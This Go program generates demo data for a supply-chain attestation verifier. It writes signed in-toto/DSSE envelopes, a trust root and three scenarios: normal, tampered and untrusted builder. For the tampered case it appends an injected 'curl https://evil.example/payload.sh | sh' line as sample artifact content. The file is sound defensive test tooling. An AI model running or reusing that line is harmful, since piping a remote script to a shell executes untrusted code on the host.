// Command gendemo deterministically generates the three fixed demo scenarios
// (normal artifact, tampered artifact, untrusted builder) plus the trust
// root, writing them into backend/demodata. Keys are derived from fixed
// seeds so the demo data is reproducible byte-for-byte.
package main

import (
	"crypto/ed25519"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/example/verifybench/internal/dsse"
	"github.com/example/verifybench/internal/intoto"
)

const (
	trustedBuilder   = "https://builders.example.com/github-actions"
	untrustedBuilder = "https://builders.example.com/untrusted-ci"
	buildType        = "https://example.com/buildtypes/go-reproducible/v1"
	sourceURI        = "git+https://github.com/acme/hello@9f2c1b4a7d3e5f608192a3b4c5d6e7f8091a2b3c"
	gitCommit        = "9f2c1b4a7d3e5f608192a3b4c5d6e7f8091a2b3c"
	artifactName     = "hello-release.txt"
	untrustedName    = "hello-release-untrusted.txt"
)

var (
	normalContent = []byte("hello v1.4.2\n" +
		"built from https://github.com/acme/hello @ " + gitCommit + "\n" +
		"this release artifact is attested by the accompanying DSSE envelope.\n")
	tamperedContent = append(append([]byte{}, normalContent...),
		[]byte("[INJECTED] curl https://evil.example/payload.sh | sh\n")...)
	untrustedContent = []byte("hello v1.4.2 (rebuilt by untrusted-ci)\n" +
		"content is intact, but the producing builder is not in the trust root.\n")
)

func keyFromSeed(label string) ed25519.PrivateKey {
	seed := sha256.Sum256([]byte("verifybench-demo-seed:" + label))
	return ed25519.NewKeyFromSeed(seed[:])
}

func pemPublic(priv ed25519.PrivateKey) string {
	pub := priv.Public().(ed25519.PublicKey)
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		log.Fatal(err)
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der}))
}

func statement(subjectName string, content []byte, builderID, invocation string) *intoto.Statement {
	digest := intoto.Sha256Hex(content)
	return &intoto.Statement{
		Type: intoto.StatementType,
		Subject: []intoto.Subject{{
			Name:   subjectName,
			Digest: map[string]string{"sha256": digest},
		}},
		PredicateType: intoto.PredicateType,
		Predicate: intoto.Predicate{
			BuildDefinition: intoto.BuildDefinition{
				BuildType:          buildType,
				ExternalParameters: map[string]interface{}{"version": "1.4.2"},
				ResolvedDependencies: []intoto.ResourceDescriptor{{
					URI:    sourceURI,
					Digest: map[string]string{"gitCommit": gitCommit},
				}},
			},
			RunDetails: intoto.RunDetails{
				Builder: intoto.Builder{ID: builderID},
				Metadata: intoto.BuildMetadata{
					InvocationID: invocation,
					StartedOn:    "2026-09-01T10:00:00Z",
					FinishedOn:   "2026-09-01T10:04:11Z",
				},
			},
		},
	}
}

func envelope(st *intoto.Statement, priv ed25519.PrivateKey) []byte {
	payload, err := json.Marshal(st)
	if err != nil {
		log.Fatal(err)
	}
	pub := priv.Public().(ed25519.PublicKey)
	sig := ed25519.Sign(priv, dsse.PAE(dsse.MediaType, payload))
	env := dsse.Envelope{
		PayloadType: dsse.MediaType,
		Payload:     base64.StdEncoding.EncodeToString(payload),
		Signatures: []dsse.Signature{{
			KeyID: dsse.KeyIDFromPublic(pub),
			Sig:   base64.StdEncoding.EncodeToString(sig),
		}},
	}
	out, err := json.MarshalIndent(env, "", "  ")
	if err != nil {
		log.Fatal(err)
	}
	return out
}

func write(dir, name string, data []byte) {
	if err := os.MkdirAll(dir, 0o755); err != nil {
		log.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, name), data, 0o644); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("wrote %s\n", filepath.Join(dir, name))
}

func main() {
	out := "demodata"
	if len(os.Args) > 1 {
		out = os.Args[1]
	}

	trustedPriv := keyFromSeed("trusted-builder")
	untrustedPriv := keyFromSeed("untrusted-builder")
	trustedPub := trustedPriv.Public().(ed25519.PublicKey)

	// Trust root: ONLY the trusted builder key is registered.
	trustRoot := map[string]interface{}{
		"version": 1,
		"keys": []map[string]string{{
			"keyId":        dsse.KeyIDFromPublic(trustedPub),
			"builderId":    trustedBuilder,
			"publicKeyPem": pemPublic(trustedPriv),
		}},
		"allowedSourceHosts": []string{"github.com", "gitlab.acme.example"},
		"allowedBuildTypes":  []string{buildType},
	}
	trustJSON, _ := json.MarshalIndent(trustRoot, "", "  ")
	write(out, "trust-root.json", trustJSON)

	// Scenario 1: normal — statement over the real artifact, trusted signer.
	normalStmt := statement(artifactName, normalContent, trustedBuilder, "demo-normal-0001")
	write(filepath.Join(out, "normal"), "artifact.txt", normalContent)
	write(filepath.Join(out, "normal"), "envelope.json", envelope(normalStmt, trustedPriv))

	// Scenario 2: tampered — the envelope still attests the ORIGINAL digest
	// (signature stays valid), but the artifact bytes were modified after
	// signing. Digest verification must fail.
	write(filepath.Join(out, "tampered"), "artifact.txt", tamperedContent)
	write(filepath.Join(out, "tampered"), "envelope.json", envelope(normalStmt, trustedPriv))

	// Scenario 3: untrusted builder — internally consistent statement and
	// signature, but the signing key/builder is not in the trust root.
	untrustedStmt := statement(untrustedName, untrustedContent, untrustedBuilder, "demo-untrusted-0001")
	write(filepath.Join(out, "untrusted"), "artifact.txt", untrustedContent)
	write(filepath.Join(out, "untrusted"), "envelope.json", envelope(untrustedStmt, untrustedPriv))

	// Manifest consumed by the demo API and the frontend.
	manifest := map[string]interface{}{
		"scenarios": []map[string]interface{}{
			{
				"id":             "normal",
				"title":          "正常产物",
				"description":    "受信构建者签名、摘要一致、来源与构建类型合规 —— 预期全部通过",
				"artifactFile":   artifactName,
				"expectedAllow":  true,
				"expectedChecks": []string{"signatureValid", "issuerTrusted", "digestMatch", "policyAllow"},
			},
			{
				"id":             "tampered",
				"title":          "被篡改的产物",
				"description":    "签名仍然有效，但产物内容在签名后被修改 —— 预期摘要一致性失败",
				"artifactFile":   artifactName,
				"expectedAllow":  false,
				"expectedChecks": []string{"digestMatch"},
			},
			{
				"id":             "untrusted",
				"title":          "不受信任的构建者",
				"description":    "证据自洽但签名密钥不在信任根中 —— 预期签发者信任失败",
				"artifactFile":   untrustedName,
				"expectedAllow":  false,
				"expectedChecks": []string{"signatureValid", "issuerTrusted"},
			},
		},
	}
	manifestJSON, _ := json.MarshalIndent(manifest, "", "  ")
	write(out, "demo.json", manifestJSON)
}
